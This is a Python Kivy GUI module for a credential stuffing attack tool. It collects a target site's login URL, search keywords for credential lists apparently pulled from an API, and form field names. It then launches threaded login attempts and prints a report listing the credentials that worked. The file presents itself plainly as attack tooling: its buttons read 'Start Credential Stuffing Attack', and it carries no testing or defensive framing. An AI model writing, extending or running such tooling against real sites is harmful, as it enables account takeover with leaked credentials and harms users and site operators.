import threading
import time

from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout

from credential_stuffing.global_variables import headers_global, USERNAME_KEY, PASSWORD_KEY, LOGIN_SUCCESS_KEY, \
    url_global, credential_limit_global
from credential_stuffing.main import get_credentials_from_api, credential_stuffing
from gui.TextInputWidget import TextInputWidget
from gui.console_view import ConsoleView
from gui.credential_stuffing.credentials_view import CredentialsView
from gui.credential_stuffing.process_manager import start_process, stop_process, is_stopped
from gui.credential_stuffing.success_manager import add_finish, clear_finishes, get_finishes_length, \
    get_successful_credentials, get_failed_credentials, clear_all, get_failed_requests_length
from gui.credential_stuffing.variables_view import VariablesView
from gui.custom_layout import CustomHeightLayout
from gui.global_variables import default_button_height
from gui.keywords_view import KeywordsView


class CredentialStuffingView(GridLayout):
    def __init__(self, console_view: ConsoleView, report_view: ConsoleView, **kwargs):
        super(CredentialStuffingView, self).__init__(**kwargs)
        self.console_view = console_view
        self.report_view = report_view

        self.cols = 1
        self.rows = 7
        self.padding = 10
        self.spacing = 10

        self.url_view = TextInputWidget(url_global, "Login URL", "Login URL Of The Website You Want To Attack")
        self.credentials_limit_view = TextInputWidget(str(credential_limit_global), "Credentials Limit", "How Many Credentials To Fetch Per Keyword (From 5 to 100)", 'int')
        self.keywords_view = KeywordsView()
        self.credentials_view = CredentialsView()
        self.variables_view = VariablesView()

        self.add_widget(self.url_view)
        self.add_widget(self.credentials_limit_view)
        self.add_widget(self.keywords_view)
        self.add_widget(self.credentials_view)
        self.add_widget(self.variables_view)

        start_attack_button_layout = CustomHeightLayout(height=default_button_height)
        self.start_button = Button(text="Start Credential Stuffing Attack")
        self.start_button.bind(on_press=self.start_credential_stuffing_attack_thread)
        start_attack_button_layout.add_widget(self.start_button)

        stop_attack_button_layout = CustomHeightLayout(height=default_button_height)
        self.stop_button = Button(text="Stop Credential Stuffing Attack")
        self.stop_button.bind(on_press=self.stop_credential_stuffing_attack_thread)
        stop_attack_button_layout.add_widget(self.stop_button)

        self.add_widget(start_attack_button_layout)
        self.add_widget(stop_attack_button_layout)

    def start_credential_stuffing_attack_thread(self, instance):
        start_process()
        threading.Thread(target=start_credential_stuffing_attack, args=(self,)).start()

    def stop_credential_stuffing_attack_thread(self, instance):
        stop_process()


def start_credential_stuffing_attack(self: CredentialStuffingView):
    url = self.url_view.get_text()
    credential_limit = self.credentials_limit_view.get_text()
    keywords = self.keywords_view.get_keywords()

    username_variable = self.variables_view.get_variable_values(USERNAME_KEY)
    password_variable = self.variables_view.get_variable_values(PASSWORD_KEY)
    login_success_variable = self.variables_view.get_variable_values(LOGIN_SUCCESS_KEY)

    if len(self.credentials_view.get_credentials_list()) > 0:
        credential_stuffing(username_variable, password_variable, login_success_variable, url,
                            headers_global, self.console_view, "None", self.credentials_view.get_credentials_list())

    if len(keywords) > 0:
        for keyword in keywords:
            threading.Thread(target=credential_stuffing,
                             args=(username_variable, password_variable, login_success_variable, url,
                                   headers_global, self.console_view, keyword, credential_limit)).start()
            if is_stopped():
                break

    threading.Thread(target=check_state, args=(keywords, credential_limit, self.console_view, self.report_view)).start()


def check_state(keywords, credential_limit, console_view: ConsoleView, report_view: ConsoleView):
    while get_finishes_length() < ((len(keywords) - get_failed_requests_length()) * int(credential_limit)) and not is_stopped():
        print(get_finishes_length(), (len(keywords) - get_failed_requests_length()) * int(credential_limit))
        console_view.add_text_schedule(f"Waiting for response...")
        time.sleep(1)

    if not is_stopped() and ((len(keywords) - get_failed_requests_length()) * int(credential_limit)) == get_finishes_length():
        console_view.add_text_schedule("--------------Credential Stuffing Attack Complete--------------")
    else:
        console_view.add_text_schedule("--------------Credential Stuffing Attack Stopped--------------")

    output_report_results(report_view)
    clear_all()

def output_report_results(report_view: ConsoleView):
    report_results = f"--------------Credential Stuffing Attack Report START--------------\n"
    report_results = report_results + f"[INFO] Successful Credentials found: {len(get_successful_credentials())}\n"

    for credential_string in get_successful_credentials():
        report_results = report_results + (credential_string + "\n" + "-" * 50 + "\n")

    report_results = report_results + f"[INFO] Unsuccessful Credentials found: {len(get_failed_credentials())}"
    report_results = report_results + f"\n[INFO] Total Credentials Tested: {len(get_failed_credentials()) + len(get_successful_credentials())}\n"
    report_results = report_results + f"--------------Credential Stuffing Attack Report END--------------\n"

    report_view.add_text_schedule(report_results)
